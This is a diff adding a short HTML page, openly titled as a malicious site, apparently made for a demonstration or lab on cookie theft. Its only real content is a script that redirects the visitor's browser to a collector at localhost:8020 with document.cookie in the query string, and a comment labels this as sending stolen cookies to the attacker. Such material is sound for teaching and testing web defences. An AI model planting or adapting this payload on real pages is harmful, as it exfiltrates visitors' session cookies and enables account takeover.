@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Some not cool site</title>
+</head>
+    <body>
+
+    <h1>Some malicious site</h1>
+
+    </body>
+<!--Sends all the stolen cookies to the attacker-->
+<script type="text/javascript">
+    document.location='http://localhost:8020/?c='+document.cookie;
+</script>
+</html>
